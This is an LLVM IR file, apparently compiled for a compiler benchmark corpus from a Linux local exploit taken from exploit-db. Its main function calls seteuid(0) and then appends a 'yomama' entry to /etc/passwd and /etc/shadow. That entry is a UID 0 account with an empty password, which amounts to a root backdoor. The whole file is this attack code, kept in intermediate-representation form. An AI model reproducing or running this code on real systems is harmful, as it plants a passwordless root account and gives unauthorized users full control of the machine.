; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20000.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20000.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [12 x i8] c"/etc/passwd\00", align 1
@O_APPEND = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"yomama:x:0:0::/root:/bin/sh\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"/etc/shadow\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"yomama::11029:0:99999:7:::\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [40 x i8], align 16
  %3 = call i32 @seteuid(i32 0)
  %4 = load i32, i32* @O_APPEND, align 4
  %5 = load i32, i32* @O_WRONLY, align 4
  %6 = or i32 %4, %5
  %7 = call i32 @open(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i32 %6)
  store i32 %7, i32* %1, align 4
  %8 = getelementptr inbounds [40 x i8], [40 x i8]* %2, i64 0, i64 0
  %9 = call i32 @strcpy(i8* %8, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %10 = load i32, i32* %1, align 4
  %11 = getelementptr inbounds [40 x i8], [40 x i8]* %2, i64 0, i64 0
  %12 = getelementptr inbounds [40 x i8], [40 x i8]* %2, i64 0, i64 0
  %13 = call i32 @strlen(i8* %12)
  %14 = call i32 @write(i32 %10, i8* %11, i32 %13)
  %15 = load i32, i32* %1, align 4
  %16 = call i32 @close(i32 %15)
  %17 = load i32, i32* @O_APPEND, align 4
  %18 = load i32, i32* @O_WRONLY, align 4
  %19 = or i32 %17, %18
  %20 = call i32 @open(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i32 %19)
  store i32 %20, i32* %1, align 4
  %21 = getelementptr inbounds [40 x i8], [40 x i8]* %2, i64 0, i64 0
  %22 = call i32 @strcpy(i8* %21, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %23 = load i32, i32* %1, align 4
  %24 = getelementptr inbounds [40 x i8], [40 x i8]* %2, i64 0, i64 0
  %25 = getelementptr inbounds [40 x i8], [40 x i8]* %2, i64 0, i64 0
  %26 = call i32 @strlen(i8* %25)
  %27 = call i32 @write(i32 %23, i8* %24, i32 %26)
  %28 = load i32, i32* %1, align 4
  %29 = call i32 @close(i32 %28)
  ret i32 0
}

declare dso_local i32 @seteuid(i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
